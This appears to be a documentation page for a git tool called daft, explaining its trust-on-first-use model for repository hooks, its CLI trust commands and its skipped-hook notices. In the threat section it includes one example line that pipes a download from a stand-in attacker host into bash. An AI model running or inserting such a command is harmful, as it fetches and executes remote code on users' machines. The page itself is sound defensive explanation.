---
title: Trust & security
description:
  How daft hooks balance team-shared automation with security against malicious
  .daft/ directories.
---

# Trust & security

daft hooks are committed to the repo and run on developer machines — same shape
as a `package.json` `postinstall`, with the same risk: a malicious `daft.yml`
can run arbitrary code. daft mitigates this with a **trust-on-first-use** model.

## The threat

When you clone a repository, daft can fire hooks automatically — running
`worktree-post-create` to set up your environment, for example. That is
convenient when the repo is your own project. It becomes a risk when you clone a
repository you have not reviewed: the `daft.yml` committed there runs whatever
it says, on your machine, under your user account, before you have read a single
line of it.

The attack surface is the same as any tool that executes code on clone or
checkout. A repository's `daft.yml` is not sandboxed. If a job runs
`curl https://attacker.example/payload | bash`, it does exactly that. The threat
is real for public repositories, for supply-chain compromises, and for any
workflow where someone else controls the repository content.

This is not a theoretical concern unique to daft. npm's `postinstall`, Cargo
build scripts, and `.envrc` files all share this property. What distinguishes
them is whether the tool makes trust explicit before executing.

## The model

daft uses a trust-on-first-use approach, modeled after the UX pattern of SSH
host keys: you explicitly grant trust once, and then the tool remembers your
decision. By default, hooks from a repository are in the `deny` state — they
never run. Before hooks run automatically, a developer must elevate trust to
`prompt` (the tool asks before each execution) or `allow` (the tool runs without
asking).

Trust is stored in a local database outside the repository, so it cannot be
influenced by the repository itself. When you run `git daft hooks trust`, daft
records the current repository's remote URL as a fingerprint alongside the trust
level. That record persists across sessions and does not require repeating for
every new worktree in the same repository.

If the remote URL of a repository changes after trust was granted — for example,
if a different repository is cloned to the same local path — daft detects the
mismatch and automatically downgrades trust to `prompt`, printing a warning.
This prevents a swap attack where a hostile repo replaces a trusted one without
triggering a re-review. Running `git daft hooks trust` again grants trust to the
new remote URL.

The full CLI surface for managing trust is:

```bash
# Grant full trust (hooks run without prompting)
git daft hooks trust

# Set to prompt before each execution
git daft hooks prompt

# Explicitly deny (hooks never run)
git daft hooks deny

# Remove trust entry entirely (returns to default deny, no record kept)
git daft hooks trust reset

# Check current trust state for this repository
git daft hooks status

# List all trusted repositories
git daft hooks trust list

# Prune stale entries from the trust database
git daft hooks trust prune

# Clear all trust settings across all repositories
git daft hooks trust reset all
```

See [`git daft-hooks`](/reference/cli/git-daft-hooks) for the full CLI
reference.

## Skipped hooks are never silent

When a command would have run a hook but the repository isn't trusted, daft says
so. An untrusted repo skipping its hooks is the trust model working as designed,
not a problem — so this is a plain notice, not a `warning:`. Every command that
fires lifecycle hooks — checkout, clone, merge, sync, prune, remove — prints one
notice on stderr naming the hooks it skipped and the way forward:

```
2 daft.yml hooks not run: worktree-pre-create, worktree-post-create — this repo isn't trusted.
   To run them, trust this repo:       git daft hooks trust
   Then replay this worktree's setup:  git daft hooks run worktree-post-create
```

The notice covers both config shapes (`daft.yml` and `.daft/hooks/` scripts),
appears once per command no matter how many hooks were skipped, and never
touches stdout, so shell integration and scripted output stay clean. Passing
`--skip-hooks all` (or a hook-type selector naming the fire) suppresses it — an
explicit opt-out is not a surprise worth reporting. The suggestion lines honor
`DAFT_NO_HINTS=1`; the notice itself always prints.

### Replaying hooks you skipped

Each trust-skip is also recorded. When you later run `git daft hooks trust`,
daft checks those records and lists the setup hooks that never ran, scoped to
the worktrees that still exist:

```
Hooks were skipped here while the repository was untrusted. Replay them:
  git daft hooks run post-clone               # in main
  git daft hooks run worktree-post-create     # in feature/a, feature/b
```

Run the suggested command inside each listed worktree to apply the setup side
effects (installs, symlinks, env files) retroactively. Only the idempotent setup
hooks are suggested — `post-clone` and `worktree-post-create`. Pre-flight and
removal hooks belong to operations that already happened, and merge hooks depend
on per-merge environment variables, so replaying them would be meaningless or
harmful. A record is cleared the moment the hook actually runs for that worktree
(including via `hooks run`), so the suggestions stay accurate.

## Trust granularity

Trust is granted at the **repository** level, identified by remote URL. There is
no separate trust level per hook type or per individual job. When you trust a
repository, all its hooks are trusted; when you deny it, none of them run.

This means trust is a single decision about whether you have reviewed and accept
the repository's automation as a whole, not a per-hook surgical grant. For
repositories you own or have reviewed, `allow` is the right choice. For
repositories where you want a reminder before anything runs — for example, after
a `git pull` that touched `daft.yml` — `prompt` gives you that checkpoint.

## Where to next

- **CLI:** [`git daft-hooks`](/reference/cli/git-daft-hooks)
- **Reference:** [Lifecycle hooks](/hooks/lifecycle),
  [YAML reference](/hooks/yaml-reference)
